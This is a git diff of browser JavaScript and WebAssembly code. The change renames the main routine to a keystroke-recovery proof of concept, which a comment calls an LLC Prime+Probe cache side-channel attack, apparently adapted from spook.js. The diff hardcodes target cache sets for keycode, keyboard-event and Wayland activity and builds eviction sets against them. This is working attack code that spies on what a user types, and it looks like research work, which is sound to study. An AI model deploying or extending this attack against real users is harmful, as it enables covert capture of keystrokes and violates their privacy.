@@ -627,8 +627,8 @@ async function find_evsets_all_slices(victim, module, memory, buffer, num_call){
     return found_sets;
 }
 
-// code adopted from create_spook_js in spook.js 
-async function l3pp_main(){ 
+// This function provides a proof of concept LLC Prime+Probe attack to recover keystrokes
+async function l3pp_keystrokes_poc(){ 
     const {module, memory} = await getAccessModules();
     const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
     const buffer = new Uint32Array(memory.buffer);
@@ -646,8 +646,6 @@ async function l3pp_main(){
     
     const KBD_KEYCODE_SET = 366;
     const KEYCODE_SLICE = 3;
-    // const KBD_KEYCODE_SET = Math.floor(Math.random() * NUM_SETS_PER_SLICE);
-    // const KEYCODE_SLICE = Math.floor(Math.random() * NUM_SLICES);
     const KBD_KEYCODE_VICTIM = KBD_KEYCODE_SET*LINE_SIZE;
     log(`set: ${KBD_KEYCODE_SET}, slice: ${KEYCODE_SLICE}`)
 
@@ -656,15 +654,11 @@ async function l3pp_main(){
 
     const KBD_EVENT_SET = 413;
     const EVENT_SLICE = 3;
-    // const KBD_EVENT_SET = Math.floor(Math.random() * NUM_SETS_PER_SLICE);
-    // const EVENT_SLICE = Math.floor(Math.random() * NUM_SLICES);
     const KBD_EVENT_VICTIM = KBD_EVENT_SET*LINE_SIZE;
     log(`set: ${KBD_EVENT_SET}, slice: ${EVENT_SLICE}`)
     event_found_sets = await find_evsets_all_slices(KBD_EVENT_VICTIM, module, memory, buffer, 1);
     log(event_found_sets);
 
-    // const WAYLAND_SET = Math.floor(Math.random() * NUM_SETS_PER_SLICE);;
-    // const WAYLAND_SLICE = Math.floor(Math.random() * NUM_SLICES);
     const WAYLAND_SET = 1746;
     const WAYLAND_SLICE = 3;
     const WAYLAND_VICTIM = WAYLAND_SET * LINE_SIZE;
@@ -751,4 +745,5 @@ async function l3pp_main(){
     await stopTimer();
 }
 
-l3pp_main()
+l3pp_keystrokes_poc()
+
